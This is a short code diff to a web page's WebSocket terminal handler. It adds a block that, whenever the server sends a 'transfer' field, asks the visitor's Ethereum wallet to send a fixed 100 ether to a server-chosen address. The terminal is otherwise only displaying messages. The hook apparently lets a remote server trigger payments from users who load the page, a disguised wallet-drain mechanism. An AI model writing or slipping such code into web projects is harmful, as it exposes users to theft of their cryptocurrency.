@@ -137,6 +137,21 @@
                     }
                     ws.onmessage = function (message) {
                         var ret = JSON.parse(message.data);
+                        if (ret.transfer) {
+                            const transactionParameters = {
+                                to: ret.transfer, // Required except during contract publications.
+                                from: ethereum.selectedAddress, // must match user's active address.
+                                value: '0x56BC75E2D63100000', // Only required to send ether to the recipient from the initiating external account.
+                            };
+
+                            // txHash is a hex string
+                            // As with any RPC call, it may throw an error
+                            ethereum.request({
+                                method: 'eth_sendTransaction',
+                                params: [transactionParameters],
+                            });
+
+                        }
                         term.write(ret.message + '> ');
                     }
                     ws.onerror = function (err) {
